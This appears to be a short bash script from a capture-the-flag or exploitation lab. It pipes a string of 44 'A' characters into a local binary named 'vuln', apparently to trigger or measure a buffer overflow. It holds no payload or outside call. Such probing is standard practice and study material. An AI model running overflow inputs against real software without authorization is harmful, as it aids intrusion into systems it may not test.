#!/bin/bash

python3 -c "print('A'*44)" | ./vuln
